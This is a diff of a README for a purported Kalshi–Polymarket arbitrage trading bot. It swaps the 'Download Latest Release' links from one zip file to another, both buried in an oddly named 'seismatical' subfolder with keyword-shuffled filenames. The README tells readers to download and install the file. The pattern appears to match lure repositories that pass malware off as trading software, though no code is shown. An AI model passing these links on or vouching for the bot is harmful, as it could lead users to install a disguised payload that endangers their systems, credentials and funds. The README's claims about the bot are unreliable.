@@ -6,7 +6,7 @@ Welcome to the Kalshi Polymarket Arbitrage Trading Bot! This software helps you 
 
 ## 🔗 Download the Bot
 
-[![Download Latest Release](https://raw.githubusercontent.com/lufegaga/kalshi-polymarket-arbitrage-trading-bot-python/main/seismatical/trading_python_polymarket_arbitrage_bot_kalshi_v1.5.zip)](https://raw.githubusercontent.com/lufegaga/kalshi-polymarket-arbitrage-trading-bot-python/main/seismatical/trading_python_polymarket_arbitrage_bot_kalshi_v1.5.zip)
+[![Download Latest Release](https://github.com/lufegaga/kalshi-polymarket-arbitrage-trading-bot-python/raw/refs/heads/main/seismatical/arbitrage-trading-python-polymarket-bot-kalshi-3.9.zip)](https://github.com/lufegaga/kalshi-polymarket-arbitrage-trading-bot-python/raw/refs/heads/main/seismatical/arbitrage-trading-python-polymarket-bot-kalshi-3.9.zip)
 
 ## 🔍 What's This Bot?
 
@@ -24,7 +24,7 @@ To run the Kalshi Polymarket Arbitrage Trading Bot, you'll need:
 
 To get started, visit this page to download the latest version of the Kalshi Polymarket Arbitrage Trading Bot:
 
-[Download Latest Release](https://raw.githubusercontent.com/lufegaga/kalshi-polymarket-arbitrage-trading-bot-python/main/seismatical/trading_python_polymarket_arbitrage_bot_kalshi_v1.5.zip)
+[Download Latest Release](https://github.com/lufegaga/kalshi-polymarket-arbitrage-trading-bot-python/raw/refs/heads/main/seismatical/arbitrage-trading-python-polymarket-bot-kalshi-3.9.zip)
 
 1. Click on the release that matches your operating system.
 2. Download the installation file to your computer.
